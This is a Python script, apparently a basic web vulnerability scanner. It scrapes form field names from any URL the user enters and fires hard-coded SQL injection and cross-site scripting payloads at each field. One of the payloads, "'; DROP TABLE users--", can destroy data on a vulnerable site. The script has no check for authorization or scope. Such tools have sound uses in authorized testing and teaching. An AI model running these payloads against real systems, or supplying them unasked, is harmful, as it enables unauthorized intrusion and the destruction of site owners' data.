import requests
from bs4 import BeautifulSoup

# Vulnerabilities to test
SQL_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users--", "' AND '1'='1"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]

def check_sql_injection(url, params):
    """
    Test for SQL Injection vulnerabilities.
    """
    print("\n[+] Testing for SQL Injection...")
    for payload in SQL_PAYLOADS:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            response = requests.get(url, params=test_params)
            if "syntax error" in response.text.lower() or "database error" in response.text.lower():
                print(f"[-] Potential SQL Injection found with parameter '{param}' and payload '{payload}'")
                return True
    print("[-] No SQL Injection vulnerabilities found.")
    return False

def check_xss(url, params):
    """
    Test for Cross-Site Scripting (XSS) vulnerabilities.
    """
    print("\n[+] Testing for XSS...")
    for payload in XSS_PAYLOADS:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            response = requests.get(url, params=test_params)
            if payload in response.text:
                print(f"[-] Potential XSS found with parameter '{param}' and payload '{payload}'")
                return True
    print("[-] No XSS vulnerabilities found.")
    return False

def get_input_fields(url):
    """
    Extract input fields from the target URL.
    """
    print("\n[+] Extracting input fields from the page...")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    inputs = {}
    for form in forms:
        for input_tag in form.find_all("input"):
            input_name = input_tag.get("name")
            if input_name:
                inputs[input_name] = ""
    print(f"[+] Found input fields: {list(inputs.keys())}")
    return inputs

def main():
    target_url = input("Enter the target URL (e.g., https://example.com): ").strip()  # Input URL for testing
    
    # Extract input fields from the target
    params = get_input_fields(target_url)
    if not params:
        print("[-] No input fields found. Cannot proceed with tests.")
        return
    
    # Test for vulnerabilities
    check_sql_injection(target_url, params)
    check_xss(target_url, params)

if __name__ == "__main__":
    main()